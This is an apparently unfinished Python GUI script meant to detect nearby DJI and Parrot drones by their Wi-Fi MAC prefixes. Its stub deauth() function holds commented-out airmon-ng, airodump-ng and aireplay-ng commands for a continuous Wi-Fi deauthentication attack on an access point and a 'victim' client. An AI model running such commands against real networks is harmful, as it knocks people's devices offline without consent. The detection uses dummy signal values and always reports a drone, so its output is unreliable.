#!/usr/bin/python
from tkinter import *
from tkinter import messagebox
from tkinter import PhotoImage
from PIL import Image,ImageTk
import googlemaps
import urllib
import urllib.request
import math
import base64
from sys import platform
import os
import gmplot

def scanDrones():
    # 60:60:1F = DJI Phanton
    # 90:03:B7, A0:14:3D, 00:12:1C, 00:26:7E = Parrot

    mac_addresses = ["60:60:1F", "90:03:B7", "A0:14:3D", "00:12:1C", "00:26:7E"]

    # check for cross platform functionality
    if platform == "linux" or platform == "linux2":
        scan = os.popen("airodump-ng -d "+mac_addresses[0]+":00:00:00 -m FF:FF:FF:00:00:00 wlan0").read()
    elif platform == "darwin":
        # command to get APs for OS X
        pass
    elif platform == "win32":
        scan = os.popen("netsh wlan show network mode=bssid | findstr \""+mac_addresses[0]+" Signal\"").read()

    #dummy set of signal level (dbm)
    signalLevel = -57

    distance = get_distance(signalLevel)
    messagebox.showinfo( "Drone detected", "Drone detected in "+str(distance)+" meters")

def get_distance(signal):
    #calculate distance (m)
    frequency = 2412 #dummy set of frequency (MHz)
    exp = (27.55 - (20 * math.log10(frequency)) + abs(signal)) / 20.0;
    distance = math.pow(10,exp)
    return distance

def deauth():
    #airmon-ng start wlan0
    #iwlist wlan0
    # get the channel..
    #airodump-ng mon0 -c <channel>  --bssid  <mac address of AP>
    #iwconfig wlan0 channel 11
    #iwconfig mon0 channel 11
    #aireplay-ng --deauth 0 -a <mac address of AP> -c <mac address of client/victim> mon0
    pass

top = Tk()
top.geometry("200x200")

gmap = gmplot.GoogleMapPlotter(37.428, -122.145, 16)
gmap.draw("mymap.html")

button = Button(top, text ="Start scanning", command = scanDrones)
button.pack(side=TOP)

top.mainloop()